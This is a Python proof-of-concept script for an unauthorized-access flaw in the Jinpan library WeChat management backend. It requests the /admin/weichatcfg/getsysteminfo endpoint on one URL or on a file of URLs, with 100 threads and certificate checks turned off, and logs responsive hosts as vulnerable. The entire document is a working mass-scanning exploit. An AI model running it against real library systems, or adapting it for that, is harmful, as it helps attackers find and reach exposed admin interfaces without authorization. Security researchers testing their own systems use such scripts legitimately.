# 金盘图书馆微信管理后台 getsysteminfo 未授权访问漏洞
import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                                       author:MOYV                                                                                                                                    
    """
    print(test)

def poc(target):
    api_payload = "/admin/weichatcfg/getsysteminfo"
    try:
        res1 = requests.get(url=target + api_payload, verify=False, timeout=10)
        if res1.status_code == 200 and 'id' in res1.text:
            print(f"[+]{target}存在未授权访问")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在未授权访问\n")
        else:
            print(f"[-]{target}不存在未授权访问")
    except:
        print(f"[!]{target}可能存在问题，请手动检测")

def main():
    banner()
    parser = argparse.ArgumentParser(description='金盘图书馆微信管理后台_getsysteminfo_未授权访问漏洞脚本')
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()